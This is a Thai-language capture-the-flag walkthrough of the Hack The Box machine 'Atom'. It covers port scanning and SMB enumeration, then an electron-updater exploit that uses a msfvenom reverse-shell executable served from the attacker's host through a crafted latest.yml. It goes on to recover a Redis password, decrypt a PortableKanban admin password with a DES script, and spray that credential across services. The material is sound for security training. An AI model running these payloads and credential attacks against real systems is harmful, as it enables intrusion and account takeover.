
## SCAN to Target 

```bash
./scan.sh 10.10.10.237   
[*] Running rustscan...
[*] Running nmap on ports: 80,135,443,445,5985,6379
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-13 20:19 +07
Nmap scan report for 10.10.10.237 (10.10.10.237)
Host is up (0.034s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc        Microsoft Windows RPC
443/tcp  open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-title: Heed Solutions
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6379/tcp open  redis        Redis key-value store
Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-13T12:59:02
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h59m27s, deviation: 4h02m32s, median: -20m34s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: ATOM
|   NetBIOS computer name: ATOM\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-05-13T05:59:06-07:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.99 seconds

```

## Enum HTTP on Port 80 

![[Challenge/HTB Challenge/ATOM HTB/IMG/001.png]]

ด้านล่างจะพบว่ามีการใช้งานโดเมน MrR3boot@atom.htb จากนั้นให้เพิ่มข้อมูลลงไปในไฟล์ Hosts 

```bash
vim /etc/hosts
10.10.10.237 atom.htb 
```

จากนั้นหากตรวจสอบหน้า Web จะพบว่าเราสามารถ download โปรแกรมที่ชื่อว่า Heed ของ Windows ได้ และหากเข้าไปจะพบว่ามี Dictionary Listing ที่สามารถ Download ได้อยู่
![[Challenge/HTB Challenge/ATOM HTB/IMG/002.png]]
## Enum SMB 

```bash
smbclient -N -L //10.10.10.237/ -U 'anonymous'
smbclient -N  //10.10.10.237/Software_Updates  -U 'anonymous' 

smb> ls 
```


![[Challenge/HTB Challenge/ATOM HTB/IMG/003.png]]


## Host Research 
จากเอกสารเราจะพบข้อมูลสำคัญในการใช้งานโปรแกรม Head ซึ่งทำให้เราทราบว่า
1. โปรแกรมนี้ถูกสร้างโดย electron-builder
2. เราสามารถวางบางสิ่งบางอย่างลงในโฟลเดอร์ Client อะไรก็ได้ 



![[Challenge/HTB Challenge/ATOM HTB/IMG/005.png]]
![[Challenge/HTB Challenge/ATOM HTB/IMG/004.png]]

จากข้อมูลข้างต้น เราสามารถนำไปตรวจสอบข้อมูลของข่องโหว่ของโปรแกรมดังกล่าว 

![[Challenge/HTB Challenge/ATOM HTB/IMG/006.png]]

จะพบว่ามี Blog หนึ่งเขียนไว้เกี่ยวกับช่องโหว่ RCE 
https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html


## Host Exploit 
จากนั้นดำเนินการสร้าง Shell ด้วย msfvenom แต่จุดสำคัญของช่องโหว่คือ ชื่อไฟล์จะต้องมี ==Singleqoute== อยู่ด้วย

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$(ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1) LPORT=443 -f exe -o "r'everse.exe"


shasum -a 512 "r'everse.exe" | cut -d " " -f1 | xxd -r -p | base64 -w 0 

# ผลลัพธ์ ที่ได้  W+XIr+eDHZZJ/VyASn5OY2C3KVGCJIkPOfV5nDET9DqRG1yIXK/3MfLsMVCIhJ6c0TlBCjAhkWM8+xBi5ThoUA==   

vim latest.yml
version: 1.2.3
path:  http://10.10.14.9:8000/r'everse.exe
sha512: W+XIr+eDHZZJ/VyASn5OY2C3KVGCJIkPOfV5nDET9DqRG1yIXK/3MfLsMVCIhJ6c0TlBCjAhkWM8+xBi5ThoUA==
```

จากนั้น upload ไฟล์ latest.yml ด้วย smb จากนั้นรอ reverse shell กลับมาก็จะได้

![[Challenge/HTB Challenge/ATOM HTB/IMG/007.png]]


--- 

# Priv Escalation
## Redis Enum 
![[Challenge/HTB Challenge/ATOM HTB/IMG/008.png]]

เมื่อเข้าไปที่ Path ไฟล์ Config ของ Redis จะพบว่ามีการใช้งานคำสั่ง `requirepass kidvscat_yes_kidvscat` ซึ่งใน Redis หมายถึงการตั้งรหัสผ่านสำหรับการเชื่อมต่อกับ Redis server ด้วยการใช้คำสั่ง `requirepass` เพื่อกำหนดรหัสผ่านที่ต้องใช้ก่อนที่จะสามารถเข้าถึง Redis instance ได้
ในกรณีนี้:
- `requirepass` เป็นคำสั่งใน Redis ที่ใช้ในการตั้งรหัสผ่านเพื่อบังคับให้ผู้ใช้ทุกคนต้องใช้รหัสผ่านที่ถูกต้องก่อนที่จะทำการคิวรีหรือปฏิบัติการต่างๆ บน Redis server
- `kidvscat_yes_kidvscat` คือรหัสผ่านที่ถูกตั้งขึ้นในกรณีนี้
    
ตัวอย่างการใช้งาน:

เมื่อคุณตั้งค่า `requirepass kidvscat_yes_kidvscat` ในไฟล์ `redis.conf` หรือใช้คำสั่งใน Redis shell จะต้องใช้รหัสผ่านนี้ในการเชื่อมต่อ Redis ตัวอย่างเช่น:

1. การตั้งรหัสผ่านใน `redis.conf`:
    ```
    requirepass kidvscat_yes_kidvscat
    ```
    
2. การเชื่อมต่อ Redis ด้วยรหัสผ่าน:

```powershell
    redis-cli 
    AUTH kidvscat_yes_kidvscat
```
    

หากสำเร็จจะขึ้น OK  
![[Challenge/HTB Challenge/ATOM HTB/IMG/009.png]]

จากนั้นทดสอบรันคำสั่งใน Redis 
```sql
INFO

KEYS * 
pk:ids:User
pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff
pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
pk:ids:MetaDataClass


GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0



GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
{"Id":"e8e29158d70d44b1a1ba4949d52790a0","Name":"Administrator","Initials":"","Email":"","EncryptedPassword":"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi","Role":"Admin","Inactive":false,"TimeStamp":637530169606440253}

```

จากด้านบนจะพบว่าเราได้ข้อมูลของ User administrator ที่ Password ถูกเข้ารหัสไว้ ซึ่งไม่สามารถนำไปใช้ได้ 

--- 

หากรัน WinPeas จะพบไฟล์ที่น่าสนใจอยู่ภายใต้ Download 


ซึ่งหากสำรวจข้อมูลภายใต้ Download เราจะพบว่าผุ้ใช้งานดังกล่าวมีการใช้งาน PortableKanban  โดย **PortableKanban** คือเครื่องมือที่ใช้สำหรับการจัดการงานและโครงการในรูปแบบของกระดาน Kanban ซึ่งถูกออกแบบให้สามารถพกพาได้หรือใช้ได้ทุกที่ ด้วยคุณสมบัติที่สามารถปรับเปลี่ยนและติดตามสถานะของงานในลักษณะภาพรวมที่ชัดเจน โดยทั่วไปจะมีการแบ่งงานออกเป็นคอลัมน์ต่าง ๆ เช่น "To Do", "In Progress", และ "Done" เพื่อให้ทีมงานหรือบุคคลที่ใช้สามารถติดตามความคืบหน้าของงานได้ง่ายและสะดวก

## Crack Password form PortableKaban

![[Challenge/HTB Challenge/ATOM HTB/IMG/010.png]]


```python
import json  
import base64  
from des import * #python3 -m pip install des  
  
try:  
    hash = str(input("Enter the Hash : "))  
    hash = base64.b64decode(hash.encode('utf-8'))  
    key = DesKey(b"7ly6UznJ")  
    print("Decrypted Password : " + key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8'))  
except:  
    print("Wrong Hash")
```

```python
python3 -m venv venv
pip3 install des
python3 decrypt.py 
```


![[Challenge/HTB Challenge/ATOM HTB/IMG/011.png]]

หรือเราสามารถใช้ Cyberchef ได้ ดังต่อไปนี้ ซึ่งได้ผลลัพธ์เหมือนกัน 
![[Challenge/HTB Challenge/ATOM HTB/IMG/014.png]]

--- 
## Cred.txt 
administrator:kidvscat_admin_@123

---

จากข้อมูลที่พบเราสามารถทดสอบได้ว่าสามารถโจมตีไปทีโปรโตคอลอะไรได้บ้าง 
```bash
for service in wmi winrm smb mssql rdp ssh ldap ftp vnc; do netexec $service 10.10.10.237 -u 'administrator' -p 'kidvscat_admin_@123'; done 
```

![[Challenge/HTB Challenge/ATOM HTB/IMG/012.png]]

จากผลเราจะทดสอบโจมตีด้วย impacket-psexec 

![[Challenge/HTB Challenge/ATOM HTB/IMG/013.png]]

--- 
# PWN !
